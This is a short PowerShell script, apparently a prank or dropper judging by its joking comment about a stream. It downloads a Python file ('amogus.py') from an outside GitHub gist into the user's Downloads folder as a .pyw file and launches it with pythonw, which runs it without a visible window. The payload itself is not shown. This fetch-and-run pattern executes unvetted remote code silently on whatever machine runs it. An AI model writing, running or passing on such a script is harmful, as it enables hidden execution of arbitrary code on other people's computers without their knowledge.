# hello there from vlc2 stream lmao

$FileName = "$env:USERPROFILE\Downloads\hello.pyw"
if (Test-Path $FileName) {
   Remove-Item $FileName
}
Invoke-WebRequest https://gist.githubusercontent.com/iFlxy/27c802f416b70af125bba0f995fd57e1/raw/0919818aea6d35fcea6e426613f71b2445741939/amogus.py -OutFile $FileName
Start-Process pythonw $FileName
